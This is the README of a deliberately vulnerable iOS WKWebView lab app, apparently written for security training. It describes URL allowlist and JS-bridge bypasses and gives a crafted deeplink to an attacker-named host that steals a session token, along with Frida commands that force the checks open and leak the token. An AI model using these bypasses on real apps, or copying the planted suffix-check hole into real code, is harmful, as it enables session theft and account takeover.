# SecureVault — restricted WKWebView security lab

A deliberately *weakly*-restricted iOS app (a "locked down" WKWebView + native JS
bridge) plus a source→sink writeup of how every restriction is bypassable.
Built for the `.claude/skills/ios-appsec` workflow.

```
webview-lab/
├─ SecureVault/                  # the target app (Swift, UIKit, iOS 15+)
│  ├─ AppDelegate.swift
│  ├─ SceneDelegate.swift        # deeplink entry point (securevault://)
│  ├─ ViewController.swift       # WKWebView + navigation-delegate gate
│  ├─ URLAllowlist.swift         # the "restriction" under test
│  ├─ WebViewBridge.swift        # native JS bridge (token / openExternal / readFile)
│  └─ Info.plist                 # URL scheme + ATS lab settings
├─ poc/
│  ├─ evilapp.example.com.html   # attacker page exploiting the host-suffix bug
│  └─ hook.js                    # Frida runtime bypass + token leak (JB device)
└─ BYPASS.md                     # ← the "break the checks" writeup
```

## What it demonstrates

- URL allowlist bypasses: raw-string prefix/substring, the `host.hasSuffix(allowed)`
  bug (`evilapp.example.com` passes), `file:` scheme, inconsistent gates.
- WebView JS-bridge abuse: origin check fails open / suffix bug → session-token
  theft from any frame → account takeover.
- Native sinks: path-traversal file read, blind `openURL` scheme pivot.
- Runtime defeat on a jailbroken device with Frida (no .ipa modification).

## Build (needs a Mac + Xcode)

1. Xcode → **File ▸ New ▸ Project ▸ iOS App**, name `SecureVault`, interface
   *Storyboard*, language *Swift*. Delete the generated `ViewController.swift`,
   `AppDelegate.swift`, `Info.plist` and drop in the ones under `SecureVault/`.
2. Set the bundle id to `com.example.securevault` (matches the plists/schemes).
3. In **Signing & Capabilities**, pick your team. `@main` is on `AppDelegate`,
   so remove the generated `Main.storyboard` reference if Xcode complains.
4. Run on an iOS 15+ **device** (WebView + jailbreak features need real hardware).

## Test the static bypasses (no jailbreak)

Host the attacker page and give it a matching name:

```bash
# any host whose name ENDS IN app.example.com — e.g. add to /etc/hosts a name
# like "evilapp.example.com" pointing at your attacker server, serve poc/.
# Then trigger the deeplink from Safari or another app:
#   securevault://open?url=https%3A%2F%2Fevilapp.example.com%2Fevilapp.example.com.html
# or just navigate the WebView to https://evilapp.example.com/evilapp.example.com.html
```

The page calls `NativeBridge.getToken()` and exfiltrates the token.

## Test the runtime bypass (jailbroken device + frida-server)

```bash
frida-ps -U                                   # confirm device
frida -U -f com.example.securevault -l poc/hook.js
# expect: "forced ALLOW" and "[TOKEN LEAK] ... VICTIM_SESSION_TOKEN"
```

## Read this next

`BYPASS.md` — per-check SOURCE → SINK, PoC, severity, and the exact fix, with a
root-cause summary at the end.
